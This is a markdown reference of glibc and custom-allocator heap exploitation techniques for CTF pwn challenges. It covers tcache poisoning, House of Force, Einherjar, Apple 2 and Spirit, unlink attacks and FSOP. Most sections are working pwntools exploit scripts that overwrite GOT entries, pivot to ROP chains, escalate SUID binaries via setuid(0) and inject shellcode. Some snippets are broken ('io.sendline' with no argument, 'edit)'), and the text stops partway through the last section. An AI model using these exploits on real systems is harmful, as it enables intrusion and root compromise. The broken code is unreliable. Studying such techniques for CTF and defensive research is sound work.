# Heap Exploitation

Comprehensive reference covering glibc heap techniques, custom allocators, and advanced exploitation patterns for CTF pwn challenges.

## Table of Contents

### Fundamentals
- [Heap Exploitation Basics](#heap-exploitation-basics)
  - [Heap Grooming via Application Operations](#heap-grooming-via-application-operations)

### tcache Techniques
- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
- [tcache strcpy Null-Byte Overflow + Backward Consolidation](#tcache-strcpy-null-byte-overflow--backward-consolidation)
- [Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack](#tcache-double-free--fake-_io_file-vtable-stdout-hijack)
- [Tcache-to-Fastbin Promotion Cross-Bin Attack](#tcache-to-fastbin-promotion-cross-bin-attack)
- [Hidden Menu Option 1337 for Tcache Poisoning](#hidden-menu-option-1337-for-tcache-poisoning)

### Fastbin Techniques
- [IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk](#is_mmaped-bit-flip-for-unsorted-bin-leak-on-callocd-chunk)
- [Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite](#filename-regex-constrained-fastbin-via-lsb-only-heap-pointer-overwrite)

### House of X Family
- [House of Apple 2 — FSOP for glibc 2.34+](#house-of-apple-2--fsop-for-glibc-234)
  - [setcontext Variant for SUID Binaries](#setcontext-variant-for-suid-binaries)
- [House of Botcake](#house-of-botcake)
- [House of Einherjar — Off-by-One Null Byte](#house-of-einherjar--off-by-one-null-byte)
- [House of Force](#house-of-force)
- [House of Lore](#house-of-lore)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)

### Unlink Attacks
- [Classic Heap Unlink Attack](#classic-heap-unlink-attack)
- [Unsafe Unlink to BSS + Top Chunk Consolidation](#unsafe-unlink-to-bss--top-chunk-consolidation)
- [Custom Allocator Unsafe Unlink to GOT](#custom-allocator-unsafe-unlink-to-got)

### TLS and Exit-Time Exploitation
- [TLS dtor_list Hijack for Code Execution After Exit](#tls-dtor_list-hijack-for-code-execution-after-exit)

### Alternative Allocators
- [musl libc Heap Exploitation — Meta Pointer + atexit](#musl-libc-heap-exploitation--meta-pointer--atexit)
- [Custom Allocator Exploitation](#custom-allocator-exploitation)
  - [talloc Pool Header Forgery for Arbitrary Read/Write](#talloc-pool-header-forgery-for-arbitrary-readwrite)

### UAF and Info Leak Patterns
- [UAF Vtable Pointer Encoding Shell Argument](#uaf-vtable-pointer-encoding-shell-argument)
- [Uninitialized Chunk Residue Pointer Leak](#uninitialized-chunk-residue-pointer-leak)
- [Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite](#adjacent-struct-fn-pointer-overflow-for-libc-leak--got-overwrite)

### OOB and Accumulator Techniques
- [6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment](#6-bit-index-oob--written_bytes-accumulator-for-fn-pointer-increment)

---

## Heap Exploitation Basics

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

### Heap Grooming via Application Operations

**Pattern:** Multi-step application-level operations (create/reply/delete in a board, forum, or note app) to achieve controlled heap state for exploitation.

**Technique:**
1. Create N entries with overflow payloads in author/title/content fields
2. Fill reply buffers for each entry (e.g., 127 replies of `"sh"`) to place controlled data at predictable heap locations
3. Selectively delete entries to create specific heap holes
4. Allocate new entries that land in freed chunks, overlapping with surviving metadata

```python
# Example: public source 2013 Vuln 400 — board-based heap grooming
# Step 1: Create 7 posts with overflow in content field
for i in range(7):
    create_post("YOLO", "YOLO",
        "A" * 36 + pack("I", got_addr) +    # Author overflow
        "A" * 604 + pack("I", got_addr) +    # Content overflow
        pack("I", plt_addr) * 80)            # Spray GOT targets

# Step 2: Fill reply buffers to heap-spray "sh" strings
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")

# Step 3: Delete 5 of 7 to create specific heap holes
for i in [0, 1, 2, 3, 4]:
    delete_post(i)

# Step 4: Allocate 2 new entries into freed space
create_post(payload_a, payload_b, payload_c)
create_post(payload_d, payload_e, payload_f)

# Step 5: Trigger via modify + delete sequence
modify_post(target_id, trigger_payload)
delete_post(target_id)  # Triggers GOT overwrite → shell
```

**Key insight:** Application operations (create, reply, delete, modify) map to heap allocations and frees of predictable sizes. By controlling the sequence and count of operations, you achieve the same effect as direct heap manipulation but through the application's own interface.

---

## tcache Stashing Unlink Attack

**Pattern:** Exploit tcache's interaction with smallbin during `malloc()`. When tcache for a size is not full, `malloc()` from smallbin will "stash" remaining smallbin chunks into tcache. During stashing, the `bk` pointer is followed without full validation, allowing arbitrary address to be linked into tcache.

```python
# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
# The 2nd smallbin chunk has corrupted bk → target address

# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
for i in range(7):
    free(tcache_chunks[i])
# These two go to unsorted → smallbin after sorting
free(smallbin_chunk_1)
free(smallbin_chunk_2)
malloc(large_size)  # Forces sorting: chunk_a moves to smallbin

# Step 2: Drain tcache
for i in range(7):
    malloc(target_size)

# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
edit_freed_chunk(smallbin_chunk_2, bk=target_addr - 0x10)

# Step 4: Allocate from smallbin
# malloc returns smallbin_chunk_1
# Stashing mechanism follows bk chain:
#   smallbin_chunk_2 gets stashed into tcache
#   Then follows corrupted bk → target gets stashed into tcache too!
malloc(target_size)

# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
malloc(target_size)  # Returns chunk_2
malloc(target_size)  # Returns target_addr → arbitrary write!
```

**Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a heap/libc address to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.

**Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.

---

## tcache strcpy Null-Byte Overflow + Backward Consolidation

**Pattern:** `strcpy(dst, user_name)` appends a trailing NUL that falls one byte past the allocated chunk, clearing `PREV_INUSE` on the next chunk's size field. With a forged `prev_size`, `free()` triggers backward consolidation across a tcache-resident chunk, producing two overlapping heap regions. Splitting out a remainder chunk keeps main_arena pointers in the `fd`/`bk` of one of the overlapping allocations, giving an unsorted-bin-style libc leak in the tcache era.

```c
// Allocation pattern (glibc 2.27 tcache)
char *a = malloc(0xF8);            // victim 1
char *b = malloc(0x18);            // small header chunk with PREV_INUSE
strcpy(a, payload);                // 0xF8 bytes + '\0' overflows into b->size
```

```python
from pwn import *

io = process("./children_tcache")
libc = ELF("./libc-2.27.so")

# 1. Zero the 0xda memset residue with repeated smaller allocations.
for size in (0x70, 0x60, 0x50, 0x40):
    io.sendline("add"); io.sendline(str(size)); io.sendline(b"\x00" * size)

# 2. Set up two adjacent chunks:
io.sendline("add"); io.sendline("0xF8"); io.sendline(b"A" * 0xF8)     # victim 1
io.sendline("add"); io.sendline("0x18"); io.sendline(b"B" * 0x18)     # header

# 3. Free victim 1 into the smallbin (needs a > 0x408 sibling to bypass tcache).
io.sendline("add"); io.sendline("0x420"); io.sendline(b"X" * 0x420)
io.sendline("del 0")                         # smallbin → keeps libc fd/bk

# 4. Overflow via strcpy: clears PREV_INUSE, forges prev_size → backward consolidate
overflow = b"A" * 0xF0 + p64(0x100)           # fake prev_size
io.sendline("edit 1"); io.sendline
io.sendline("del 1")                         # consolidate: now we overlap

# 5. Re-allocate the coalesced region and read the libc pointer that still
#    lives in the old fd/bk location.
io.sendline("add"); io.sendline("0x110"); io.sendline(b"P" * 0x10)
io.sendline("show 0")
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - (libc.symbols["main_arena"] + 0x60)
log.success(f"libc base {libc.address:#x}")
```

**Key insight:** tcache bypasses most pre-2.27 consolidation tricks, but the `strcpy` null-byte overflow remains viable because it acts on the *next chunk's header*, not the current chunk's in-use flag. Combined with careful zeroing of glibc 2.26+ memset residue (the `0xda` pattern glibc uses on free), you can re-use classic off-by-one-null techniques even in a tcache world. The magic sizes are: large enough to skip the tcache (>0x408 for the freed chunk), small enough to land next to the overflow target.

---

## Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack

**Pattern:** Small allocation budget, fastbin + tcache available. Double-free a fastbin chunk into the tcache, malloc to obtain a tcache entry that points at `_IO_2_1_stdout_`, then overwrite stdout's `vtable` pointer to a fake jump table where `_IO_file_overflow` → `system`. Next printf call executes `system("/bin/sh")`.

```python
# 1. Free A twice (bypasses fastbin double-free via tcache)
free(A); free(A)
# 2. Malloc returns A; write stdout addr as next fd
edit(A, p64(stdout))
# 3. Next malloc returns stdout
malloc()
malloc()  # returns &stdout
edit(stdout, fake_file_struct(vtable=fake_vt))
```

Fake vtable entry: slot for `_IO_file_overflow = system`.

**Key insight:** tcache skips fastbin safety checks, so a double-free directly into the tcache works without the usual size-field trickery. The resulting write-where primitive reaches `_IO_2_1_stdout_` in libc trivially.

---

## Tcache-to-Fastbin Promotion Cross-Bin Attack

**Pattern:** Only ~2 allocations available — too few for a traditional tcache dup. Instead, fill tcache, overflow into fastbin, craft chunk whose header points inside a known structure. When fastbin allocation promotes back into tcache (after a future free), malloc returns the header address.

```python
for _ in range(7): free(tcache_chunks[_])   # fill tcache bin
free(fastbin_chunk)                         # goes to fastbin
edit(fastbin_chunk, p64(target_hdr))        # poison fastbin fd
# Drain tcache so next free of fastbin_chunk promotes:
for _ in range(7): malloc(size)
free(fastbin_chunk)                         # now lands in tcache
malloc(size)                                 # returns tcache head = target_hdr
```

**Key insight:** tcache and fastbin share size classes at certain boundaries; a chunk that starts in one often migrates to the other. Use that promotion as an additional reallocation step when budget is tight.

---

## Hidden Menu Option 1337 for Tcache Poisoning

**Pattern:** The visible menu caps allocations at a few chunks, but disassembly reveals an undocumented option (`1337`) that calls `malloc` and `edit` without updating the counter — effectively giving you unlimited allocations. Combined with a vanilla tcache UAF, this lets you flood the tcache, overwrite an entry's `fd` with a BSS target, and `malloc` arbitrary addresses.

```python
def hidden(sz, data):
    p.sendlineafter(b'>', b'1337')
    p.sendlineafter(b'size:', str(sz).encode())
    p.sendafter(b'data:', data)

free(0); free(1)
hidden(0x20, p64(bss_target))   # tcache fd → bss_target
_ = malloc(0x20)                # first chunk back
shell = malloc(0x20)            # returns bss_target
```

**Key insight:** Always dump the menu parser for undocumented branches before assuming a challenge is "rate-limited". Numeric options like `1337`, `9999`, `0xdead` are classic bypasses that the author ships to debug the challenge.

---

## IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk

**Pattern:** Heap overflow in a full-mitigation binary (Full RELRO, canary, NX, PIE, ASLR). `calloc` normally zeroes freshly-allocated chunks, blocking the classic unsorted-bin leak where fd/bk overlap reusable data. However, when the chunk's `IS_MMAPED` flag is set, glibc skips zeroing. Overflow the preceding chunk to flip `IS_MMAPED` on a freed unsorted-bin chunk, then re-allocate it with `calloc` — the arena pointers in fd/bk survive and leak libc.

```python
# Layout: A (0x80) | B (0x80 freed -> unsorted) | C
# Overflow from A into B's chunk header: set size |= IS_MMAPED (bit 1 of size field)
edit(A, b'A'*0x80 + p64(0) + p64(0x91 | 0x2))    # prev_size=0, size=0x91|IS_MMAPED

# calloc-reallocate B: because IS_MMAPED is set, calloc does NOT memset it.
# B's fd/bk still point to main_arena + 0x58 -> libc leak via view(B).
malloc(0x80)                   # returns B with libc pointer intact in first 16 bytes
libc_base = leak - main_arena_offset

# Follow-up: fastbin dup -> __malloc_hook -> one_gadget
```

**Key insight:** `calloc`'s zeroing is conditional on the allocator path. Setting `IS_MMAPED` via heap overflow tricks `calloc` into treating the reused chunk as freshly mmap'd and skipping `memset`, preserving any arena pointers previously written into fd/bk. A 2-bit metadata overwrite defeats the "calloc blocks leaks" assumption.

---

## Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite

**Pattern:** File-server heap has a `RENAME` handler that length-checks `old_name` twice instead of `old_name`/`new_name`, giving a bounded heap overflow into the adjacent `file_t` (`filename[0x20]`, `file_size`, `data`, `free_option`, `prev_file`). Every filename must match `[A-Za-z0-9]+.[A-Za-z0-9]{3}`, which rules out full fastbin-fd overwrites — but the regex only sees the **first null-terminated string** stored in `filename`, so the bytes after a preserved null are unconstrained. Corrupt only the LSB of `prev_file` so it re-points to `file->data` (attacker-controlled), forging a fake chunk that enables double-free + fastbin attack on `__malloc_hook`.

```python
# 1. Leak libc/heap by overwriting file_size to huge value, then RETR dumps the heap.
# 2. Create file whose data bytes satisfy regex as a fake file_t chunk header.
pc.sendline('PUT EEE.EXE {}'.format(0x48))
pc.send(p64(0x4848482e484848) + p64(0)*4       # fake filename "HHH.HHH"
        + p64(0x68)                             # fake file_size
        + p64(heap + 0x250) + p64(0)            # fake data
        + p64(heap + 0x190))                    # fake prev_file
# 3. Produce two 0x70 freed chunks, then overwrite LSB of file->prev_file via rename:
pc.sendline('RENAME EEE.EXE ' + 'E'*7*8 + 'EEEEE.EXP')
# Only LSB of prev_file changes -> upper bytes preserved, LSB lands inside data.
# 4. DELE the forged entry -> double-free on 0x70 tcache/fastbin.
# 5. Classic fastbin poison onto __malloc_hook - 0x23, then trigger with PUT.
```

**Key insight:** When an overflow is byte-addressable but must pass a character-class filter, target only the LSB of heap-metadata pointers. Heap addresses share upper bytes across chunks, so a single attacker-controlled LSB relocates a pointer inside the same 256-byte window — enough to land it in a buffer you already control, bypassing regex/charset constraints that would reject a full 8-byte overwrite.

---

## House of Apple 2 — FSOP for glibc 2.34+

**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

**Fake FILE structure requirements:**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.

**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

### setcontext Variant for SUID Binaries

When exploiting SUID-root binaries, `system("/bin/sh")` fails because dash drops privileges when `uid != euid`. Replace the `system(fp)` target with `setcontext(fp)` to pivot to a ROP chain that calls `setuid(0)` first:

```python
# Wide vtable targets setcontext instead of system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
})

# setcontext loads registers from offsets relative to RDX (which points to fp->_wide_data):
#   RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]
# Place ROP chain at _wide_data structure:
fake_wide_data = flat({
    0x18: p64(0),                     # _IO_write_base = 0
    0x30: p64(0),                     # _IO_buf_base = 0
    0x68: p64(0),                     # RDI = 0 (for setuid(0))
    0xa0: p64(rop_chain_addr),        # RSP = pivot to ROP chain
    0xa8: p64(libc.sym.setuid),       # RIP = setuid as first call
    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
})

# ROP chain at rop_chain_addr:
rop = flat([
    pop_rdi_ret,
    libc.address + 0,               # After setuid(0) returns here
    #... additional setup...
    libc.sym.system,
    next(libc.search(b"/bin/sh\x00")),
])
```

**Trigger chain:** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → stack pivot → `setuid(0)` → `system("/bin/sh")`.

**Key insight:** `setcontext` is a universal stack pivot gadget — it loads RSP, RDI, and RIP from controlled memory, enabling arbitrary ROP execution from a FILE-based exploit. Essential for SUID binaries where dash enforces `uid == euid`.

---

## House of Botcake

**Pattern:** Post-2.26 glibc heap exploitation when hooks are removed. Use overlapping chunks created via double-free and size manipulation to corrupt tcache/smallbin metadata, enabling arbitrary allocations at controlled addresses (e.g., stdout for leak, stack for ROP).

**Full chain (libc 2.34):**
1. Allocate chunks: 6 tcache fillers + 2 target chunks (A, B) + 1 padding
2. Free fillers and padding to populate tcache/smallbins
3. Free B then A to place libc pointers in heap
4. Allocate overlapping chunk over A/B via size manipulation
5. Poison tcache/smallbin fd to target (e.g., _IO_2_1_stdout_)
6. Allocate to stdout, overwrite for leak (e.g., environ via FILE structure)
7. Use stack leak for second arbitrary allocation (ROP on stack)

**Example exploitation:**
```python
# Setup overlapping via House of Botcake
free(7)  # B into unsorted
free(6)  # A into unsorted
add(9, 0x100, p64(0xdeadbeef)*2)  # Allocate from tcache
free(7)  # Double-free B

# Overlapping alloc
add(10, 0x130, '\x00'*0x108 + p64(0x111) + p64(target_addr ^ (heap>>12)))

# Poison to stdout
add(11, 0x100, 'nop')
add(12, 0x100, p64(0xfbad1800) + ... + p64(environ))  # Leak stack

# Allocate on stack for ROP
free(11)
edit(11, p64(stack_addr ^ (heap>>12)))
add(13, 0x100, 'pad')
add(14, 0x100, '/bin/sh\x00' + rop_chain)  # Overwrite return addr
```

**Key insight:** Overlapping allocations enable tcache poisoning without direct UAF. Corrupt FILE structures for info leaks when GOT overwrites are blocked. Chain with stack allocation for ROP when no hooks exist.

**Requirements:** Double-free, UAF for editing freed chunks, libc 2.26+ (tcache era).

---

## House of Einherjar — Off-by-One Null Byte

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit chain:**
1. Set `prev_size` of next chunk to create fake backward consolidation
2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
3. After consolidation, overlapping chunks enable tcache poisoning
4. Overwrite `stdout` or `_IO_list_all` for FSOP

**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**Setup sequence:**
1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
2. Write fake chunk into A with self-referencing pointers
3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
4. Free B → consolidates backward into A → overlapping chunk
5. Allocate over the overlap region to control other live chunks

---

## House of Force

**Pattern:** Overwrite the wilderness (top) chunk's size field with a large value (e.g., `0xffffffffffffffff`), then request a carefully calculated allocation to move the heap pointer to an arbitrary address (e.g., GOT table).

```python
from pwn import *

elf = ELF('./target')
libc = ELF('./libc.so.6')

# Step 1: Overflow into top chunk header, set size to -1 (0xffffffffffffffff)
add_card(-1, b'A' * 24 + p64(0xffffffffffffffff))

# Step 2: Calculate distance from top chunk to target (e.g., GOT entry)
# evil_size = target_address - current_top_chunk_ptr - metadata_size
target = elf.got['strtol']
evil_size = target - 16 - top_chunk_ptr

# Step 3: Allocate evil_size to advance top chunk pointer to target
add_card(evil_size - 25, b'')

# Step 4: Next allocation overlaps the target - write desired value
# Overwrite strtol@GOT with system() address
add_card(100, p64(libc.symbols['system']))

# Step 5: Trigger - next call to strtol(user_input) calls system(user_input)
io.sendline(b'/bin/sh')
```

**Key insight:** House of Force requires: (1) overflow into the top chunk to control its size field, (2) a single malloc of attacker-controlled size to position the heap, (3) a subsequent allocation at the target address. Works on glibc < 2.29 where top chunk size validation was added.

---

## House of Lore

**Pattern:** Corrupt a smallbin chunk's `bk` pointer to point to a fake chunk in attacker-controlled memory. When the smallbin is used for allocation, the fake chunk gets linked into the bin. A second allocation returns the fake chunk, giving arbitrary write.

```python
# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
free(chunk_a)
malloc(large_size)  # Forces sorting: chunk_a moves to smallbin

# Step 2: Forge fake chunk in target area
# fake->fd must point back to the real smallbin chunk
# fake->bk must point to another valid-looking chunk (or same)
fake = flat(
    0, 0x91,                    # prev_size, size
    addr_of_real_chunk,         # fd → points back to legitimate chunk
    addr_of_fake2,              # bk → another fake or self
)

# Step 3: Overwrite chunk_a->bk to point to our fake chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# Step 4: Two allocations from this smallbin
alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
```

**Key insight:** Requires corrupting `bk` of a freed smallbin chunk. The fake chunk's `fd` must point back to a chunk whose `bk` points to the fake — glibc checks `victim->bk->fd == victim`. On older glibc this check is weaker.

---

## House of Orange

**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite the top chunk size to a small value via heap overflow. Next large allocation fails the top chunk, forces `sysmalloc` to free the old top chunk into unsorted bin. Then corrupt the freed chunk for FSOP or tcache attack.

```python
# Step 1: Overflow to corrupt top chunk size
# Top chunk must have PREV_INUSE set and size aligned to page
# Size must be < MINSIZE away from page boundary
edit)  # Fake small top chunk

# Step 2: Request larger than corrupted top size
# Forces sysmalloc → old top freed into unsorted bin
add(0x1000, b'B')  # Triggers the free

# Step 3: Unsorted bin attack or FSOP from here
# Overwrite _IO_list_all via unsorted bin's bk pointer
```

**Key insight:** House of Orange creates a free chunk without ever calling `free()` — essential when the binary has no delete/free functionality. The corrupted top chunk size must satisfy: `(size & 0xFFF) == 0` (page-aligned end), `size >= MINSIZE`, and `PREV_INUSE` bit set.

**Requirements:** Heap overflow that can reach top chunk metadata. glibc < 2.26 for classic variant; modern versions need FSOP chain (House of Apple 2).

---

## House of Spirit

**Pattern:** Forge a fake chunk in attacker-controlled memory (stack, .bss, or heap), then `free()` it to get it into a bin. Next allocation of that size returns the fake chunk, giving write access to the target area.

```python
# Forge fake fastbin chunk on the stack
# Need valid size field and next chunk's size for validation
fake_chunk = flat(
    0,              # prev_size
    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
    0,              # next chunk prev_size
    0x41,           # next chunk size (passes free() validation)
)

# Write fake chunk address somewhere the binary will free()
# e.g., overwrite a pointer that gets passed to free()
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)

# Trigger free(target_ptr) → fake chunk enters fastbin
trigger_free()

# Next malloc(0x38) returns our fake chunk → write to controlled area
malloc_and_write(0x38, payload)
```

**Key insight:** The key constraint is that `free()` validates the size of the chunk AND the size of the "next" chunk (at `chunk + size`). Both must look valid — sizes in fastbin range (0x20-0x80 on 64-bit), with proper alignment and flags.

**Tcache variant (glibc >= 2.26) — simpler, no next-chunk validation:**
```python
# Tcache free() only checks:
# 1. size field is valid (≥ 0x20, aligned to 0x10)
# 2. chunk pointer is aligned
# No next-chunk size validation!
# Forge fake chunk on stack, write only one size field:

# In exploit: create a note that allocates on the stack (or lets you write there)
# Write fake 0x300 chunk header at stack_addr - 0x10
write_at(stack_addr - 0x10, p64(0) + p64(0x301))  # prev_size=0, size=0x300|PREV_INUSE

# Free it — goes into tcache for 0x300 chunks
trigger_free(stack_addr)

# Now alloc 0x2f0 chunk → returns stack_addr
# You get arbitrary write covering the return address!
create(0x2f0)
write_to_note(rop_chain_at_return_address_offset)
```

**House of Spirit on stack — extended technique (idekCTF pattern):**
```python
# Allocate a note buffer on the stack (program does malloc → returns stack-adjacent alloc)
create(0, 112)       # allocates 112 bytes on stack (intentional design)
view(0)              # leaks adjacent stack data (libc/canary addresses)

# Create another note, write fake 0x300 chunk header via it
create(1, 31)
write(1, p64(0)*3 + b'\x00\x03' + b'\x00'*5)  # size = 0x300

# Free note[0] (the stack buffer) — tcache accepts it due to fake size
delete(0)

# Alloc 0x2f0 chunk → returns the stack buffer
create(2, 0x2f0)
# read full 0x2f0 bytes including return address area
buf = view(2)
# patch return address in buffer, write it back
buf[return_offset:return_offset+8] = p64(one_gadget)
write(2, buf)
# exit → execute ROP/one_gadget
```

---

## Classic Heap Unlink Attack

**When to use:** Old glibc (< 2.26, no tcache) or educational heap challenges. Overflow one heap chunk's metadata to corrupt the next chunk's `prev_size` and `size` fields, then trigger an unlink during `free()` that writes an arbitrary value to an arbitrary address.

**How dlmalloc unlink works:**
```c
// When free() consolidates with an adjacent free chunk:
// FD = P->fd, BK = P->bk
// FD->bk = BK    (write BK to FD + offset)
// BK->fd = FD    (write FD to BK + offset)
// This is a write-what-where primitive
```

**Exploit pattern:**
1. Allocate two adjacent chunks (A and B)
2. Overflow A's data into B's chunk header:
   - Set B's `prev_size` to A's data size (fake "previous chunk is free")
   - Clear B's `PREV_INUSE` bit in `size` field
   - Craft fake `fd` and `bk` pointers in A's data area
3. Free B → `free()` thinks A is also free, triggers backward consolidation → unlink on fake chunk

```python
from pwn import *

# Fake chunk in A's data region
fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)

# Overflow from A into B's header
payload = p64(0)              # fake prev_size for A
payload += p64(data_size)     # fake size for A (marks A as "free")
payload += p64(fake_fd)       # fd pointer
payload += p64(fake_bk)       # bk pointer
payload += b'A' * (data_size - 32)  # fill A's data
payload += p64(data_size)     # overwrite B's prev_size
payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit

# After free(B): target_addr now contains a pointer we control
```

**Modern mitigations:** glibc 2.26+ added safe-unlinking checks (`FD->bk == P && BK->fd == P`). For modern heaps, use tcache poisoning, House of Apple 2, or House of Einherjar instead.

**Key insight:** The unlink macro performs two pointer writes. By controlling `fd` and `bk` in a fake chunk, you get a constrained write-what-where: each location gets the other's value. Classic use: overwrite a GOT entry with the address of a win function or shellcode.

---

## Unsafe Unlink to BSS + Top Chunk Consolidation

**Pattern:** After a classic unsafe unlink writes a self-referential pointer into a BSS note table, craft a second fake chunk in BSS whose size spans from the BSS address to the heap's top chunk: `size = (heap_top_addr - bss_fake_addr) | PREV_INUSE`. Freeing this fake chunk consolidates it with the top chunk, effectively relocating the heap's allocation base into BSS. Subsequent malloc calls return memory overlapping the global pointer table, granting arbitrary read/write.

```python
# Step 1: Unsafe unlink places self-pointer at bss_table[3]
# Fake chunk: fd = &bss_table[3] - 0x18, bk = &bss_table[3] - 0x10
add_memo(248, p64(0) + p64(0) + p64(bss_table + 0x100 + 8 - 24) +
         p64(bss_table + 0x100 + 8 - 16) + b'A' * 208 + p64(prev_size))

# Step 2: Fake BSS chunk with size spanning to top chunk
fake_size = heap_base + 0x310 - bss_addr + 0x1  # | PREV_INUSE
edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
delete_memo(1)  # consolidation moves top chunk to BSS

# Step 3: malloc now returns BSS memory — overwrite global pointers
add_memo(size, p64(environ_addr))  # write &environ into note slot
# read_memo leaks stack address from environ
```

**Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.

---

## Custom Allocator Unsafe Unlink to GOT

**Pattern:** Non-glibc allocator with naive `free` — sets `mem[fd] = bk` (and symmetric `mem[bk+4] = fd`) without any safe-unlink consistency check. Overflow from the 10th chunk (0x104 bytes) corrupts chunk 11's `fd`/`bk` so that when chunk 9 is freed and chunk 11 becomes its "neighbour" during consolidation, the unlink writes `printf@GOT` → shellcode jump.

```python
from pwn import *
context(arch='i386', os='linux')

printf_got = 0x804c004
array_10_addr = 0x...   # leaked from banner output "loc=0xADDR"

payload  = p32(printf_got - 8)       # fake fd -> target = printf GOT (minus 8 for offset)
payload += p32(array_10_addr + 8)    # fake bk -> value = addr of shellcode jump
payload += b"\xeb\x08" + b"A"*8 + asm(shellcraft.sh())  # jmp +8; pad; shellcode
payload += b"A" * (260 - len(payload))
